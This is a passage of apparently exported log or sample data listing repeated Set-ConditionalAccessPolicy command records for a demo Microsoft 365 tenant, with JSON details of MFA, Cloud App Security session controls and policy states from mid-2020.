'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '6/29/2020 4:43:12 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/30/2020 2:05:13 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/30/2020 2:05:13 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '6/30/2020 2:05:17 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/30/2020 2:05:15 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '6/30/2020 5:06:20 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/30/2020 5:06:20 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/1/2020 1:49:42 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/1/2020 1:49:42 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/1/2020 5:13:17 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/1/2020 5:13:17 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/2/2020 2:05:21 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/2/2020 2:05:23 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/2/2020 4:53:56 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/2/2020 4:53:56 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/3/2020 2:12:09 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/3/2020 2:12:08 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/3/2020 5:10:57 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/3/2020 5:10:58 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/4/2020 2:02:50 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '7/4/2020 2:02:50 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/4/2020 4:58:34 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/4/2020 4:58:34 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/5/2020 2:09:01 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/5/2020 2:09:01 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/5/2020 5:05:51 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/5/2020 5:05:51 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': 